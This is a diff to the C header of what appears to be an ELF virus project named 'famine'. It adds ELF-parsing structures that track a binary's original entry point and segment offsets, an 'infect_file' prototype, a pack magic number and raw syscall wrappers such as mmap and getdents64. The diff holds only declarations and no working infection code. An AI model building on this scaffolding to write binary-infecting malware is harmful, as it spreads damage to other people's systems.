@@ -13,13 +13,20 @@
 #include <stdlib.h>
 #include <string.h>
 #include <limits.h>
+#include <sys/mman.h>
+#include <elf.h>
 
 ////////////////////////////////////////////////////////////////////////////////
 /// DEFINES
 ////////////////////////////////////////////////////////////////////////////////
 
-#define FILE_TYPE 8
+#define ELF_MAGIC_SIZE 4
+#define ELF_MAGIC_NUMBER 1179403647
+#define PACK_MAGIC_NUMBER 0x15D25
 
+#define X86_64 2
+
+#define FILE_TYPE 8
 #define DIR_MAX 12
 
 #define BUFF_SIZE 1024*1024*5
@@ -33,8 +40,8 @@
 
 struct linux_dirent64
 {
-	unsigned long d_ino;
-	unsigned long d_off;
+	unsigned long long d_ino;
+	unsigned long long d_off;
 	unsigned short d_reclen;
 	unsigned char d_type;
 	char d_name[];
@@ -47,6 +54,26 @@ struct directory
 	int size;
 };
 
+struct elf
+{
+	void *ptr;
+	unsigned long long size;
+	unsigned long long old_entrypoint;
+
+	unsigned long long segment_offset;
+	unsigned long long segment_addr;
+	unsigned long long segment_size;
+
+	unsigned long long section_offset;
+	unsigned long long section_addr;
+	unsigned long long section_size;
+};
+
+struct criteria
+{
+	bool (*f)(const struct elf *file);
+};
+
 ////////////////////////////////////////////////////////////////////////////////
 /// PROTOTYPES 
 ////////////////////////////////////////////////////////////////////////////////
@@ -57,6 +84,9 @@ void famine(struct directory *dir);
 // INFECT_C
 __attribute__((hot)) void infect_file(const char *filename);
 
+// FILE_C
+struct elf get_file(const char *str);
+
 // INLINE_C
 int _open(const char *pathname, int flags, long mode);
 int _close(int fd);
@@ -64,6 +94,8 @@ int _write(int fd, const void *buf, long count);
 int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 int _stat(const char *pathname, struct stat *statbuf);
 int _getuid(void);
+void *_mmap(void *addr, unsigned long length, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long offset);
+int _munmap(void *addr, unsigned long length);
 
 // UTILS_C
 unsigned long _strlen(const char *str);
